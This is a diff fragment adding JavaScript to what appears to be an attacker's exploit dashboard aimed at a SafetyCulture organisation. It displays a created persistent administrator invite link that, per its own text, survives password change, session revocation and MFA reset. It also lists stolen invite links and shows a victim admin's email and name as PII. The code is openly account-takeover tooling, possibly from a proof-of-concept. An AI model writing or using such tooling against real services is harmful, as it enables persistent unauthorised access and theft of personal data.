+          addCard('invite-main', 'CREATE: Admin Invite Link <span class="badge critical">PERSISTENT ATO</span>', 'red',
+            '<div class="invite-box">' +
+            '<div style="font-size:15px;font-weight:700;color:#69f0ae;margin-bottom:8px">Administrator Invite Link — Persistent Access</div>' +
+            '<div class="link">' + esc(inv.url) + '</div>' +
+            '<div class="copy-hint">Attacker opens this URL → joins organization as full Administrator<br>Survives password change, session revocation, MFA reset</div>' +
+            '</div>', true);
+        }
+      } catch(e) {}
+      break;
+
+    // ─── LIST: Stolen invite links ───
+    case 'LIST-INVITES':
+      pct();
+      try {
+        var ld = JSON.parse(data);
+        tlAdd('LIST: ' + (ld.links ? ld.links.length : 0) + ' existing invite links stolen');
+        if (ld.links && ld.links.length > 0) {
+          var linksHtml = '';
+          ld.links.forEach(function(l) {
+            linksHtml += '<div style="font-family:monospace;font-size:12px;color:#69f0ae;margin:4px 0">https://app.au.safetyculture.com/' + esc(l) + '</div>';
+          });
+          addCard('stolen-links', 'READ: Stolen Invite Links <span class="badge critical">ATO</span>', 'red', linksHtml, false);
+        }
+      } catch(e) {}
+      break;
+
+    // ─── Admin profile ───
+    case 'ADMIN-PROFILE':
+      try {
+        var ap = JSON.parse(data);
+        addCard('admin', 'Victim Admin Profile <span class="badge warn">PII</span>', 'yellow',
+          '<div class="val"><span class="label">Email</span><span class="secret">' + esc(ap.email || '?') + '</span>' +
+          '<span class="label">User ID</span>' + esc(ap.id || '?') +
+          '<span class="label">Name</span>' + esc((ap.firstname || '') + ' ' + (ap.lastname || '')) + '</div>');
+      } catch(e) {}
+      break;
+
+    // ─── Org Settings ───
+    case 'ORG-SETTINGS':
+      try {
+        var os = JSON.parse(data);
+        tlAdd('READ: Org settings — ' + os.len + ' bytes');
+      } catch(e) {}
+      break;
+
+    default:
+      tlAdd('[' + api + '] ' + (typeof data === 'string' ? data.substring(0, 200) : JSON.stringify(data).substring(0, 200)));
+  }
+});
+</script>
